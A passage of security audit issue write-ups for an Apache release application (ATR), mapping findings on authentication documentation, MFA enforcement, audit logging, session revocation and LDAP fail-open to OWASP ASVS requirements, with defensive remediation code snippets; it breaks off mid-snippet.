**Description:**

### Summary
Neither the authentication security documentation nor the input validation documentation contains a list of context-specific words that should be prevented from use in passwords. ATR has intimate knowledge of numerous context-specific terms that would be weak password choices for its users including organization names (Apache, ASF), product identifiers (ATR), committee names (dynamically stored), project names (dynamically stored), role names (committer, member, chair, admin, root, participant), system terms (release, revision, signing, openpgp, oauth), and infrastructure terms (ldap, jwt, token, pat). Although ATR delegates password management to ASF OAuth, ATR is the authoritative source for many context-specific terms and should maintain a documented banned word list.

### Details
No context-specific banned word list exists in `atr/docs/authentication-security.md` or `atr/docs/input-validation.md`. Context-specific data exists in `atr/admin/__init__.py` (~lines 130-145, ~156) and `atr/storage/__init__.py`.

### Recommended Remediation
Create a documented context-specific banned word list in authentication-security.md or a new dedicated document. The list should include:
1. Static terms: organization names (apache, asf), product names (atr), roles (committer, member, chair, admin, root, participant, pmc), system terms (release, revision, signing, openpgp, oauth, ldap, token)
2. Dynamic terms: committee names from sql.Committee table, project names from sql.Project table, project codenames
3. Maintenance schedule: review when new committees/projects are added, during annual security reviews, or when application is renamed/restructured
4. Implementation note clarifying this list serves as reference for ASF OAuth service since ATR does not manage passwords directly

### Acceptance Criteria
- [ ] Context-specific banned word list documented
- [ ] Static terms listed
- [ ] Dynamic term sources identified
- [ ] Maintenance schedule defined
- [ ] Implementation note added
- [ ] Documentation reviewed and approved

### References
- Source reports: L2:6.1.2.md
- Related findings: ASVS-612-LOW-002
- ASVS sections: 6.1.2

### Priority
Medium

---

## Issue: FINDING-214 - No Consolidated Authentication Pathway Documentation

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
ASVS 6.1.3 requires that multiple authentication pathways are documented together with security controls and authentication strength that must be consistently enforced across them. Current documentation is fragmented across multiple files. Web OAuth and API JWT/PAT are well-documented in authentication-security.md, SSH is not documented as an authentication pathway, GitHub OIDC is only briefly mentioned with controls not fully documented, and Basic Auth is documented as 'not used' but potentially active. No single document provides a complete list of all pathways, security controls comparison table, authentication strength comparison, enforcement consistency documentation, or pathway-specific threat models.

### Details
Documentation is fragmented across `atr/docs/authentication-security.md`, `atr/docs/asfquart-usage.md`, `atr/docs/overview-of-the-code.md`, and `atr/docs/running-the-server.md` without comprehensive coverage.

### Recommended Remediation
Create `atr/docs/authentication-pathways.md` with consolidated documentation including:
- Complete list of all 5 authentication pathways (Web OAuth, API JWT, SSH, GitHub OIDC, Basic Auth)
- Summary table with mechanism/strength/LDAP check/rate limit/MFA/TTL/status for each pathway
- Detailed description of security controls for each pathway
- Consistency requirements that all pathways must enforce
- Documentation of known gaps with references to findings

### Acceptance Criteria
- [ ] New authentication-pathways.md document created
- [ ] All 5 pathways documented
- [ ] Comparison table included
- [ ] Security controls detailed for each
- [ ] Known gaps documented
- [ ] Documentation reviewed and approved

### References
- Source reports: L2:6.1.3.md
- Related findings: ASVS-613-MED-002, ASVS-613-MED-003
- ASVS sections: 6.1.3

### Priority
Medium

---

## Issue: FINDING-215 - SSH Authentication Pathway Missing from Authentication Documentation

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
ATR implements a complete SSH authentication pathway with its own security model (public key authentication from database, GitHub workflow key validation with expiration checks, hardened algorithm selection via ssh-audit policies, permission-based authorization), but this pathway is not documented in authentication-security.md. The token lifecycle diagram shows OAuth/PAT/JWT flows but omits the SSH pathway entirely. This prevents auditors from assessing whether SSH authentication controls are consistent with other pathways.

### Details
In `atr/ssh.py` (lines 87-160), complete SSH authentication exists but is not documented in `atr/docs/authentication-security.md`.

### Recommended Remediation
Add a dedicated 'SSH Authentication' section to authentication-security.md documenting:
- SSH key authentication mechanism
- GitHub workflow key authentication
- Supported algorithms (ciphers, KEX, MACs from ssh-audit policy)
- Security controls (algorithm hardening, key expiration, database-backed keys, permission validation, host key security, LDAP verification status)
- Entry points (SSH server on port 2222, used by rsync)

### Acceptance Criteria
- [ ] SSH Authentication section added to documentation
- [ ] Authentication mechanism documented
- [ ] Supported algorithms listed
- [ ] Security controls detailed
- [ ] Entry points documented
- [ ] Documentation reviewed and approved

### References
- Source reports: L2:6.1.3.md
- Related findings: ASVS-613-MED-001
- ASVS sections: 6.1.3

### Priority
Medium

---

## Issue: FINDING-216 - GitHub OIDC Security Controls Incompletely Documented

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Current documentation only briefly mentions GitHub OIDC validation: 'For trusted publishing workflows, ATR validates OIDC ID tokens issued by GitHub Actions. ATR verifies the token signature using the provider's JWKS endpoint, and checks the issuer, audience, expiration, and expected claims.' However, the actual implementation includes 6 additional critical security controls not documented: dangerous JWT header rejection (jku, x5u, jwk), domain allowlisting for JWKS URI, HTTPS enforcement on JWKS URI, specific claim verification (enterprise, enterprise_id, repository_owner, runner_environment), TLS verification using create_secure_session(), and algorithm restriction (only RS256). These controls represent critical security boundaries for trusted publishing.

### Details
In `atr/jwtoken.py` (lines 151-214), comprehensive GitHub OIDC validation exists but only basic validation is documented in `atr/docs/authentication-security.md`.

### Recommended Remediation
Add a dedicated 'GitHub OIDC Trusted Publisher Authentication' section to authentication-security.md documenting:
- Mechanism overview
- Complete token validation process (header inspection, JWKS URI validation, signature verification, claim verification)
- All security controls with implementation details
- Entry points
- Trusted publishing flow diagram
- Limitations (no LDAP account status check with reference to ASVS-613-HIGH-003)

### Acceptance Criteria
- [ ] GitHub OIDC section added to documentation
- [ ] Complete validation process documented
- [ ] All 6 additional security controls listed
- [ ] Flow diagram included
- [ ] Limitations documented
- [ ] Documentation reviewed and approved

### References
- Source reports: L2:6.1.3.md
- Related findings: ASVS-613-MED-001, ASVS-613-HIGH-003
- ASVS sections: 6.1.3

### Priority
Medium

---

## Issue: FINDING-217 - No Context-Specific Word List Exists in the Application

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
There is no documented or coded context-specific word list anywhere in the provided source code. ASVS 6.2.11 and NIST SP 800-63B §5.1.1.2 require that when memorized secrets are created, they are checked against context-specific words such as: the service name (atr, apache), the organization name (Apache Software Foundation, ASF), the user's identifier (asf_uid), the user's email domain (apache.org), and common derivatives of the above. No such list is defined, no validation function performs this check, and no configuration file references one. If any secret in this system is user-chosen (rather than cryptographically generated), users could create secrets containing easily guessable context-specific terms like apache2024, atr-token, or their own asf_uid.

### Details
No context-specific word list or validation function exists in the codebase. This is a Type A gap - complete absence of the control.

### Recommended Remediation
Define a context-specific word list and validate secrets against it before acceptance. Create a module (e.g., atr/security/password_policy.py) containing a CONTEXT_SPECIFIC_WORDS list including terms like 'apache', 'asf', 'foundation', 'atr', 'release', 'token', 'password', 'admin', 'committer', 'apache.org', 'software'. Implement a check_context_specific_words() function that validates secrets against this list and the user's asf_uid, returning any violations found. This function should be called before accepting any user-chosen secrets.

### Acceptance Criteria
- [ ] Context-specific word list module created
- [ ] Word list includes static context-specific terms
- [ ] Validation function implemented
- [ ] Validation checks user's asf_uid
- [ ] Function called before accepting user-chosen secrets
- [ ] Unit tests verifying validation

### References
- Source reports: L2:6.2.11.md
- Related findings: ASVS-6211-MED-002
- ASVS sections: 6.2.11

### Priority
Medium

---

## Issue: FINDING-218 - add_token() Accepts Pre-Hashed Token Without Upstream Strength Verification Contract

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The add_token() method receives a token_hash (already hashed) and stores it directly. Because the secret has already been hashed before reaching this function, it is impossible to perform any content-based validation (including context-specific word checking) at this layer. The only validation performed is that label is non-empty. This is a Type A gap - the entry point where a secret is committed to storage has no strength validation, and the architecture (receiving a pre-hashed value) prevents implementing it here. The calling code (not provided) must perform this validation, but there is no enforced contract ensuring it does.

### Details
In `atr/storage/writers/tokens.py` (lines 53-73), add_token() accepts pre-hashed token_hash without ability to validate strength.

### Recommended Remediation
Either (Option A) validate the plaintext token before hashing at this layer by modifying add_token() to accept raw_token instead of token_hash, validate token strength using check_context_specific_words() before hashing, then hash with SHA3-256; or (Option B) document the security contract if tokens are always system-generated, explicitly stating that token_hash MUST be derived from a cryptographically random token and user-chosen values MUST NOT be accepted. Additionally, add format validation to verify token_hash matches expected SHA3-256 hex digest format (64 hex characters).

### Acceptance Criteria
- [ ] Either: Plaintext token validation before hashing
- [ ] Or: Security contract documented
- [ ] Format validation for token_hash added
- [ ] Unit tests verifying validation or contract

### References
- Source reports: L2:6.2.11.md
- Related findings: ASVS-6211-MED-001
- ASVS sections: 6.2.11

### Priority
Medium

---

## Issue: FINDING-219 - Undocumented LDAP Basic Auth Pathway with Weaker Security Controls

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The asfquart framework contains a conditional LDAP Basic Authentication pathway that activates silently if the `asfpy.aioldap` module becomes available. This pathway is not documented in ATR's authentication security documentation and implements weaker security controls compared to the primary OAuth pathway. Missing controls include: no MFA enforcement, no asf-banned attribute check (only queries group memberships), no session creation audit log, creates persistent cookie session from single-factor auth, and session metadata lacks OAuth-provided attributes. If `asfpy.aioldap` becomes available (dependency update, environment change), an undocumented authentication pathway activates silently.

### Details
In `src/asfquart/session.py` (lines 71-85), conditional LDAP Basic Auth exists without documentation and with weaker controls than OAuth.

### Recommended Remediation
Add a before_request hook in atr/server.py to explicitly reject Basic authentication. Check if 'Authorization' header contains Basic auth type and raise ASFQuartException with 401 error. Alternative: document this pathway in authentication-security.md and add equivalent security controls (ban check, audit logging, MFA enforcement).

### Acceptance Criteria
- [ ] Basic authentication explicitly rejected in before_request
- [ ] Or: Basic auth pathway documented with security controls
- [ ] Ban check added if pathway documented
- [ ] Audit logging added if pathway documented
- [ ] Unit tests verifying rejection or security controls

### References
- Source reports: L2:6.3.4.md
- ASVS sections: 6.3.4

### Priority
Medium

---

## Issue: FINDING-220 - Test Authentication Pathway Bypasses All Standard Controls

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
When `ALLOW_TESTS` configuration is enabled, the application exposes a `/test/login` endpoint that requires no credentials and weakens multiple security controls application-wide. The weakened controls include: authentication bypass (no credentials required), rate limiting disabled application-wide, authorization augmented (test committee membership auto-granted), and admin routes exposed that are only available in test mode. If `ALLOW_TESTS` is accidentally enabled in production (misconfiguration, environment variable leak), an attacker gains full authenticated access with no credentials, no rate limiting on any endpoint, augmented permissions, and access to test-only admin routes.

### Details
In `tests/e2e/helpers.py` (lines 40-42), test authentication pathway exists. Configuration in `atr/server.py` and `atr/principal.py`.

### Recommended Remediation
Add validation function `_validate_test_mode()` during server startup that exits with fatal error if ALLOW_TESTS is enabled in production environment or without DEBUG mode. Include warning log when test mode is enabled.

```python
def _validate_test_mode():
    if config.get().ALLOW_TESTS:
        if not config.get().DEBUG:
            sys.exit("FATAL: ALLOW_TESTS enabled without DEBUG mode")
        if is_production_environment():
            sys.exit("FATAL: ALLOW_TESTS enabled in production")
        logger.warning("Test mode enabled - authentication and security controls weakened")
```

### Acceptance Criteria
- [ ] Test mode validation added to startup
- [ ] Fatal error if enabled without DEBUG
- [ ] Fatal error if enabled in production
- [ ] Warning logged when test mode enabled
- [ ] Unit tests verifying validation

### References
- Source reports: L2:6.3.4.md
- ASVS sections: 6.3.4

### Priority
Medium

---

## Issue: FINDING-221 - MFA Not Enforced on Any Authentication Pathway

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The framework provides MFA enforcement capability through `Requirements.mfa_enabled`, and OAuth sessions carry an `mfa` flag from the identity provider. However, no ATR route enforces MFA, allowing users to access all functionality with single-factor authentication. Users can access all authenticated functionality without MFA including sensitive operations: release management (signing, publishing, announcing), key operations (generation, rotation, revocation), vote resolution (binding project decisions), admin functions (system configuration), and token management (PAT creation, JWT issuance). This violates ASVS L2 requirement to force the use of multi-factor authentication.

### Details
In `src/asfquart/session.py` (line 19), MFA capability exists. In `src/asfquart/auth.py`, MFA requirement available but not used. No routes in `atr/blueprints/get.py` or `atr/blueprints/post.py` enforce MFA.

### Recommended Remediation
Add `auth.Requirements.mfa_enabled` to sensitive operations using `@auth.require({auth.Requirements.committer, auth.Requirements.mfa_enabled})` decorator. Apply to release operations, token management, admin operations, and key operations. For API JWT pathway, include MFA claim in JWT when PAT was created during MFA session by adding `atr_mfa` claim to JWT payload in `jwtoken.py:issue()` function.

### Acceptance Criteria
- [ ] MFA requirement added to release operations
- [ ] MFA requirement added to token management
- [ ] MFA requirement added to admin operations
- [ ] MFA requirement added to key operations
- [ ] MFA claim included in API JWTs
- [ ] Unit tests verifying MFA enforcement

### References
- Source reports: L2:6.3.4.md
- ASVS sections: 6.3.4

### Priority
Medium

---

## Issue: FINDING-222 - SSH Authentication Pathway Lacks Rate Limiting

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The SSH authentication pathway does not implement rate limiting that is enforced on Web OAuth (100 req/min) and JWT API (500 req/hr) pathways. While workflow SSH keys are high-entropy and short-lived, the lack of rate limiting allows unlimited connection attempts. An attacker can perform unlimited SSH authentication attempts, consuming server resources through connection handling overhead, database queries for key lookups (per attempt), LDAP queries (if LDAP check added per HIGH-001 remediation), and log file growth. Mitigating controls include workflow SSH keys being high-entropy (not guessable), 20-minute TTL, only 'github' username accepted for workflow keys, and user SSH keys requiring database registration.

### Details
In `atr/ssh.py`, SSH server lacks connection-level rate limiting.

### Recommended Remediation
Implement connection tracking per IP address in SSHServer.connection_made() method. Track connection timestamps in a dictionary, clean entries older than 60 seconds, enforce maximum connections per minute (suggest 20), and close connection immediately if rate limit exceeded. Include logging of rate limit violations.

```python
_connection_attempts: dict[str, list[float]] = {}

def connection_made(self, connection):
    peer_addr = connection.get_extra_info('peername')[0]
    now = time.time()
    
    # Clean old entries
    if peer_addr in self._connection_attempts:
        self._connection_attempts[peer_addr] = [
            t for t in self._connection_attempts[peer_addr] if now - t < 60
        ]
    else:
        self._connection_attempts[peer_addr] = []
    
    # Check rate limit
    if len(self._connection_attempts[peer_addr]) >= 20:
        logger.warning(f"SSH rate limit exceeded for {peer_addr}")
        connection.close()
        return
    
    self._connection_attempts[peer_addr].append(now)
    super().connection_made(connection)
```

### Acceptance Criteria
- [ ] Connection tracking per IP implemented
- [ ] Rate limit enforced (20 connections/minute)
- [ ] Connections closed on rate limit violation
- [ ] Rate limit violations logged
- [ ] Unit tests verifying rate limiting

### References
- Source reports: L2:6.3.4.md
- ASVS sections: 6.3.4

### Priority
Medium

---

## Issue: FINDING-223 - MFA Status Captured But Never Enforced for Any Operation

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The MFA flag is received from ASF OAuth and stored in the session (session.mfa), but no code in any of the provided files ever reads or checks session.mfa for access control decisions. This means security-sensitive operations (particularly PAT creation, which generates a 180-day credential) proceed regardless of whether MFA was actually completed during the current session. If ASF OAuth were to allow non-MFA fallback sessions, ATR would not catch the downgrade, creating a defense-in-depth gap.

### Details
In `src/asfquart/session.py` (line 15), MFA flag is stored but never checked. In `atr/blueprints/common.py` (authenticate()) and `atr/storage/writers/tokens.py` (FoundationCommitter.add_token()), no MFA verification occurs.

### Recommended Remediation
Implement MFA enforcement for security-sensitive operations such as PAT creation. Add a middleware or dedicated function to check session.mfa before allowing credential creation:

```python
# In atr/blueprints/common.py or a dedicated middleware
async def require_mfa_for_sensitive_ops() -> None:
    web_session = await asfquart.session.read()
    if web_session is not None and not web_session.mfa:
        raise base.ASFQuartException(
            "MFA verification required for this operation", errorcode=403
        )

# Apply to PAT creation endpoints or other sensitive operations
```

### Acceptance Criteria
- [ ] MFA check function created
- [ ] MFA enforcement added to PAT creation
- [ ] MFA enforcement added to other sensitive operations
- [ ] Appropriate error message returned
- [ ] Unit tests verifying MFA enforcement

### References
- Source reports: L2:6.4.3.md
- Related findings: ASVS-643-LOW-001
- ASVS sections: 6.4.3

### Priority
Medium

---

## Issue: FINDING-224 - Admin Authentication Factor Operations Lack Elevated Identity Verification

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Admin operations that affect other users' authentication factors (bulk revocation, key rotation, impersonation) only require confirmation strings rather than re-authentication or MFA verification. The `browse_as` feature copies the admin's MFA status to the impersonated session, meaning an admin without MFA could impersonate a user and create factors that should require MFA-level assurance. JWT key rotation affects all users globally and should require the highest level of identity verification. An admin can authenticate without MFA (if permitted by OAuth), use 'Browse As' to impersonate a user whose account requires MFA for factor management, and create a PAT without MFA verification, violating the user's security policy.

### Details
In `atr/admin/__init__.py`, admin operations (revoke_user_tokens_post line 420, rotate_jwt_key_post line 445, browse_as_post line 115) lack elevated verification. Confirmation forms (lines 89, 93) use only string confirmation.

### Recommended Remediation
Require MFA verification before allowing admin operations that affect other users' authentication factors. Add an MFA check in revoke_user_tokens_post(), rotate_jwt_key_post(), and browse_as_post() that verifies session.session.mfa is True before proceeding. For browse_as functionality, either require MFA for the admin session or do not copy the admin's MFA status to the impersonated session; instead, track that it's an admin-impersonated session separately and apply appropriate security controls.

### Acceptance Criteria
- [ ] MFA verification added to revoke_user_tokens_post
- [ ] MFA verification added to rotate_jwt_key_post
- [ ] MFA verification added to browse_as_post
- [ ] Impersonated sessions do not inherit MFA status
- [ ] Or: Admin MFA required for browse_as
- [ ] Unit tests verifying MFA enforcement

### References
- Source reports: L2:6.4.4.md
- Related findings: ASVS-644-HIGH-001, ASVS-644-HIGH-002
- ASVS sections: 6.4.4

### Priority
Medium

---

## Issue: FINDING-225 - JWT API Authentication Success Not Logged

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The @jwtoken.require() decorator logs all JWT authentication failures but does not log successful authentications. This creates an incomplete audit trail that only captures negative events. All exception handlers properly log failures (jwt_token_expired, jwt_signature_invalid, jwt_token_invalid), but when verification succeeds, the code silently sets quart.g.jwt_claims without logging. This prevents reconstruction of successful API access patterns and forensic investigation of compromised accounts.

### Details
In `atr/jwtoken.py` (lines 72-88, 89-122, 124-175), JWT verification logs failures but not successes.

### Recommended Remediation
Add success logging after all exception handlers, before setting quart.g.jwt_claims:

```python
log.info('jwt_authentication_success', extra={
    'asf_uid': claims.get('sub'),
    'jti': claims.get('jti'),
    'endpoint': quart.request.endpoint
})
```

Apply the same pattern to verify_github_oidc() function (lines 124-175).

### Acceptance Criteria
- [ ] Success logging added to JWT verification
- [ ] Success logging added to GitHub OIDC verification
- [ ] Log includes asf_uid, jti, and endpoint
- [ ] Unit tests verifying success logging

### References
- Source reports: L1:7.2.2.md
- ASVS sections: 7.2.2

### Priority
Medium

---

## Issue: FINDING-226 - OAuth Authentication Decisions Not Logged

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The OAuth authentication callback handler at `/auth` makes critical authentication decisions but does not log any of them. Both successful logins and failures (invalid/expired state, OAuth provider rejection) occur silently without any audit trail. This prevents detection of state token brute-force attacks, replay attacks, or compromised accounts, as OAuth is the primary web authentication mechanism.

### Details
The OAuth callback handler in `src/asfquart/generics.py` (lines 83-109, 52-115) validates state tokens, calls OAuth providers, and creates sessions without any audit logging. No events are logged for:
- Successful OAuth authentication with user identity
- Failed authentication due to invalid/expired state tokens
- OAuth provider rejections
- State token validation failures

This creates a significant security monitoring gap for the primary authentication flow.

### Recommended Remediation
Implement an `after_request` hook in `atr/server.py` to capture OAuth authentication decisions:

```python
@app.after_request
async def log_oauth_events(response):
    if request.path == '/auth':
        if response.status_code == 200:
            # Successful OAuth login
            session_data = await asfquart.session.read()
            if session_data and 'uid' in session_data:
                log.info('oauth_login_success', extra={
                    'asf_uid': session_data['uid'],
                    'remote_addr': request.remote_addr
                })
        elif response.status_code == 403:
            # Failed OAuth login
            log.warning('oauth_login_failure', extra={
                'remote_addr': request.remote_addr,
                'state_token': request.args.get('state', '')[:8]  # Truncated
            })
    return response
```

### Acceptance Criteria
- [ ] OAuth authentication successes are logged with user identity and IP address
- [ ] OAuth authentication failures are logged with failure reason and truncated state token
- [ ] Logs include sufficient detail for security monitoring and incident response
- [ ] Unit test verifying OAuth authentication logging for success and failure cases

### References
- Source reports: L1:7.2.2.md
- Related findings: None
- ASVS sections: 7.2.2

### Priority
Medium

---

## Issue: FINDING-227 - Web-Based JWT Issuance Not Audit-Logged

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The web interface at `/tokens/jwt` allows authenticated users to issue JWTs but does not audit-log these operations. This creates an inconsistency with the API path (PAT→JWT exchange in `atr/storage/writers/tokens.py:93-127`) which properly logs JWT issuance. The lack of audit logging prevents reconstruction of web-based JWT generation timeline and detection of compromised web sessions issuing JWTs.

### Details
The `jwt_post()` function in `atr/post/tokens.py` (lines 31-39) calls `jwtoken.issue()` to create JWTs but never writes to the audit log. The API equivalent path uses `append_to_audit_log()` to record JWT issuance events with full context. This inconsistency means JWT issuance via web UI is invisible in audit trails.

### Recommended Remediation
Add audit logging to `jwt_post()` function to match API path behavior:

```python
# In atr/post/tokens.py after jwt_token = jwtoken.issue(session.uid)
log.info('web_jwt_issued', extra={
    'asf_uid': session.uid,
    'issuance_method': 'web_ui',
    'remote_addr': quart.request.remote_addr
})
```

**Alternative:** Use the existing `append_to_audit_log()` infrastructure for consistency with API path (requires access to storage writer).

### Acceptance Criteria
- [ ] Web-based JWT issuance is logged with user identity and method
- [ ] Logs are consistent with API-based JWT issuance format
- [ ] Audit trail includes sufficient detail for security monitoring
- [ ] Unit test verifying web JWT issuance logging

### References
- Source reports: L1:7.2.2.md
- Related findings: ASVS-722-LOW-002
- ASVS sections: 7.2.2

### Priority
Medium

---

## Issue: FINDING-228 - OAuth Authentication Does Not Terminate Prior Session Token

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The primary OAuth authentication callback writes new session data without first terminating the existing session token, violating ASVS 7.2.4's explicit requirement to 'terminate the current session token' before generating a new one. While the cookie-based session architecture provides inherent resistance to classical session fixation attacks (signed cookies cannot be forged), the implementation does not follow the defense-in-depth principle demonstrated elsewhere in the codebase where `session.clear()` is correctly called before writing new session data.

### Details
In `src/asfquart/generics.py` around line 97-100, the OAuth callback directly calls `session.write(oauth_data)` without first calling `session.clear()`. The `session.clear()` control EXISTS in `src/asfquart/session.py` (lines 107-117) and is correctly used in the admin browse-as flow, but is NOT CALLED at the primary authentication entry point.

### Recommended Remediation
**Option 1 (Minimal Fix - Recommended):**
```python
# src/asfquart/generics.py — OAuth callback branch (line ~97)
oauth_data = await rv.json()
asfquart.session.clear()           # ← ADD: Terminate current session token (ASVS 7.2.4)
asfquart.session.write(oauth_data) # Generate new session token
```

**Option 2 (Architectural Fix - Best Practice):** Create a dedicated `session.regenerate()` function that atomically calls `clear()` then `write()` to prevent future regressions.

**Option 3:** Add unit tests to verify OAuth authentication clears previous session data to prevent regression.

### Acceptance Criteria
- [ ] OAuth callback calls `session.clear()` before `session.write()`
- [ ] Session termination before regeneration is consistent across all authentication entry points
- [ ] Unit test verifies session regeneration behavior
- [ ] No regression in existing OAuth authentication functionality

### References
- Source reports: L1:7.2.4.md
- Related findings: ASVS-724-LOW-001
- ASVS sections: 7.2.4

### Priority
Medium

---

## Issue: FINDING-229 - Non-PAT JWTs Cannot Be Revoked on Session Termination

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
JWTs issued through the web UI (`/tokens/jwt`) are not bound to any PAT and remain valid for their full 30-minute TTL regardless of session termination, logout, or account deactivation. Only JWTs containing the `atr_th` (PAT hash) claim are validated against the PAT database. This means web-issued JWTs continue working for up to 30 minutes after the user logs out their web session, violating the principle of immediate credential invalidation.

### Details
The `jwtoken.issue()` function in `atr/jwtoken.py` (lines 92-126) generates a `jti` (JWT ID) claim for all JWTs, but this claim is never checked against any denylist or revocation registry. When `jwtoken.verify()` validates a JWT (lines 42-58), it only checks the PAT hash (`atr_th`) if present—web-issued JWTs skip this check entirely (line 54, 116-126). 

The `jwt_post()` function in `atr/post/tokens.py` (lines 33-41) issues JWTs without any linkage to server-side revocation mechanisms.

### Recommended Remediation
**Option A (Recommended):** Extend the per-user revocation timestamp approach from ASVS-741-HIGH-001 to cover JWTs. Update `jwtoken.verify()` to check the user's `sessions_invalid_before` timestamp against the JWT's `iat` (issued at) claim. This provides unified revocation for both web sessions and JWTs using a single database column.

Implementation effort: Low (1-2 developer days if combined with FINDING-230/HIGH-001).

**Alternative Options:**
- Option B: JTI Denylist using Redis
- Option C: Require PAT for All JWTs (extends existing effective pattern but is a breaking change)

### Acceptance Criteria
- [ ] Web-issued JWTs are revoked when user logs out
- [ ] JWTs are revoked when account is deactivated
- [ ] Revocation mechanism applies to all JWTs regardless of issuance method
- [ ] Unit test verifying JWT revocation on session termination

### References
- Source reports: L1:7.4.1.md
- Related findings: ASVS-741-HIGH-001
- ASVS sections: 7.4.1

### Priority
Medium

---

## Issue: FINDING-230 - Admin Blueprint post Decorator Bypasses LDAP Active Account Check

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The admin blueprint provides two route decorators with inconsistent security checks. The 'typed' decorator calls `authenticate()` including LDAP active account checks, while the 'post' decorator uses `_check_admin_access()` that validates admin status but NOT LDAP account status. This creates a latent vulnerability where admin routes using the 'post' decorator would allow deactivated LDAP accounts to continue performing privileged operations as long as they have a valid session cookie (up to 72 hours).

### Details
In `atr/blueprints/admin.py`, the `_check_admin_access()` hook (lines 23-31) validates admin status but does not call `ldap.is_active()` to verify the account is still active. The 'typed' decorator (lines 146-155) correctly calls `common.authenticate()` (lines 87-89) which includes LDAP validation via `atr/blueprints/common.py` (lines 32-38).

Manual code review indicates no current admin routes use the 'post' decorator, making this a latent vulnerability that creates false confidence for future development.

### Recommended Remediation
Update `_check_admin_access()` to call `authenticate()` which includes LDAP validation:

```python
async def _check_admin_access() -> None:
    """Validate admin access with LDAP account status check."""
    session_data = await common.authenticate()  # Includes LDAP validation
    if not session_data:
        quart.abort(401)
    if session_data.uid not in atr.admin.admins:
        quart.abort(403)
```

Alternatively, deprecate the `post` decorator entirely in favor of `typed`. Add documentation warning against using `post` decorator, or remove it entirely if not needed.

Implementation effort: Low (1 developer day including testing and documentation).

### Acceptance Criteria
- [ ] Admin 'post' decorator validates LDAP account status
- [ ] Deactivated LDAP accounts cannot access admin routes
- [ ] Consistent security checks across all admin decorators
- [ ] Unit test verifying deactivated accounts are rejected

### References
- Source reports: L1:7.4.1.md
- Related findings: ASVS-741-LOW-003
- ASVS sections: 7.4.1

### Priority
Medium

---

## Issue: FINDING-231 - Admin Token Revocation Does Not Terminate Web Sessions

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The admin panel's `revoke_user_tokens_post()` function only revokes Personal Access Tokens from the database but does not terminate active web sessions or invalidate active JWTs. After admin revocation, users retain web UI access via active sessions and API access via JWTs for up to 30 minutes. The administrator sees 'Successfully revoked N tokens' message but user access is not fully revoked, creating false confidence in security response.

### Details
The admin token revocation function in `atr/admin/__init__.py` calls the database to delete PATs but does not:
1. Terminate active web sessions
2. Invalidate active JWTs
3. Revoke SSH keys
4. Clear authorization caches

The admin template `atr/admin/templates/revoke-user-tokens.html` does not warn administrators that web sessions and JWTs remain valid after PAT revocation.

### Recommended Remediation
Extend `revoke_user_tokens_post()` to perform comprehensive credential revocation:

```python
async def revoke_user_tokens_post(asf_uid: str):
    # 1. Revoke PATs (existing)
    await write.revoke_all_user_tokens(asf_uid)
    
    # 2. Revoke SSH keys
    await write.revoke_all_user_ssh_keys(asf_uid)
    
    # 3. Add user to session deny list
    await sessions.add_to_denylist(asf_uid)
    
    # 4. Clear principal authorization cache
    await auth_cache.clear_user(asf_uid)
    
    # 5. Update success message
    return "Successfully revoked all credentials for user. Active JWTs will expire within 30 minutes."
```

Accept 30-minute window for active JWTs as acceptable risk given short TTL, or optionally implement JWT deny list.

### Acceptance Criteria
- [ ] Admin token revocation terminates web sessions
- [ ] Admin token revocation revokes SSH keys
- [ ] Success message accurately describes scope of revocation
- [ ] Documentation explains JWT expiration window
- [ ] Unit test verifying comprehensive revocation

### References
- Source reports: L1:7.4.2.md
- Related findings: ASVS-742-HIGH-001
- ASVS sections: 7.4.2

### Priority
Medium

---

## Issue: FINDING-232 - ldap.is_active() Returns True When LDAP Is Unconfigured

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The `is_active()` function in `atr/ldap.py` fails open (returns True) when LDAP bind credentials are not configured or invalid. This is a fail-open misconfiguration vulnerability where all account status checks are silently bypassed with no errors or alerts. Banned or disabled users gain full access during LDAP misconfiguration, credential rotation issues, or LDAP server unavailability.

### Details
In `atr/ldap.py` (lines 219-226), `is_active()` calls `get_bind_credentials()` which returns `None` when credentials are not configured. The function then returns `True` by default, allowing all authentication attempts to succeed regardless of LDAP account status.

This means:
- Banned users can authenticate during LDAP outages
- Disabled accounts are not enforced when LDAP is misconfigured
- No alerting occurs when LDAP validation is silently bypassed
- Security controls fail without operator awareness

### Recommended Remediation
Modify `is_active()` to fail closed in production mode:

```python
def is_active(self, uid: str) -> bool:
    """Check if LDAP account is active. Fail closed in production."""
    credentials = get_bind_credentials()
    
    if credentials is None:
        # Fail closed in production, allow in debug/test modes
        if config.get().mode == 'Production':
            log.error(f"LDAP credentials not configured - failing closed")
            raise ASFQuartException(
                "LDAP authentication service unavailable",
                errorcode=503
            )
        elif config.get().mode == 'Debug':
